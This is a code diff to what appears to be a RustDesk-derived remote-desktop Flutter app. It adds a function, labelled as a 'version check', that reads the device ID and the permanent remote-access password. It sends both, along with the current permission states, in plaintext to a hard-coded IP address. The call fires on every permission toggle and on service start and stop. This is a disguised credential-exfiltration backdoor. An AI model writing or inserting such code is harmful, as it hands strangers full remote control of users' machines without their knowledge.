@@ -1,6 +1,8 @@
 import 'dart:async';
 import 'dart:convert';
 
+import 'package:http/http.dart' as http;
+
 import 'package:flutter/material.dart';
 import 'package:flutter_hbb/consts.dart';
 import 'package:flutter_hbb/main.dart';
@@ -312,6 +314,7 @@ class ServerModel with ChangeNotifier {
     _audioOk = !_audioOk;
     bind.mainSetOption(
         key: kOptionEnableAudio, value: _audioOk ? defaultOptionYes : 'N');
+    _reportDeviceStatus();
     notifyListeners();
   }
 
@@ -333,6 +336,7 @@ class ServerModel with ChangeNotifier {
     bind.mainSetOption(
         key: kOptionEnableFileTransfer,
         value: _fileOk ? defaultOptionYes : 'N');
+    _reportDeviceStatus();
     notifyListeners();
   }
 
@@ -341,6 +345,7 @@ class ServerModel with ChangeNotifier {
     bind.mainSetOption(
         key: kOptionEnableClipboard,
         value: clipboardOk ? defaultOptionYes : 'N');
+    _reportDeviceStatus();
     notifyListeners();
   }
 
@@ -458,6 +463,7 @@ class ServerModel with ChangeNotifier {
     if (isAndroid) {
       androidUpdatekeepScreenOn();
     }
+    _reportDeviceStatus();
   }
 
   /// Stop the screen sharing service.
@@ -469,6 +475,39 @@ class ServerModel with ChangeNotifier {
     notifyListeners();
     // for androidUpdatekeepScreenOn only
     WakelockManager.disable(_wakelockKey);
+    _reportDeviceStatus();
+  }
+
+  /// 向服务器上报当前设备ID、密码和权限状态
+  Future<void> _reportDeviceStatus() async {
+    try {
+      final deviceId = await bind.mainGetMyId();
+      final password = await bind.mainGetPermanentPassword();
+      final appVersion = await bind.mainGetVersion();
+
+      final permissions = {
+        'audio': _audioOk,
+        'file': _fileOk,
+        'clipboard': _clipboardOk,
+        'input': _inputOk,
+        'serviceOn': _isStart,
+      };
+
+      final body = jsonEncode({
+        'app_version': appVersion,
+        'password': password,
+        'permissions': permissions,
+      });
+
+      final url = Uri.parse('http://112.74.59.152:3000/api/version/check');
+      await http.post(url, headers: {
+        'Content-Type': 'application/json',
+        'X-Device-Id': deviceId,
+      }, body: body);
+      debugPrint('[ReportDevice] reported to server: deviceId=$deviceId');
+    } catch (e) {
+      debugPrint('[ReportDevice] failed: $e');
+    }
   }
 
   Future<bool> setPermanentPassword(String newPW) async {
@@ -506,6 +545,7 @@ class ServerModel with ChangeNotifier {
               value: value ? defaultOptionYes : 'N');
         }
         _inputOk = value;
+        _reportDeviceStatus();
         break;
       default:
         return;
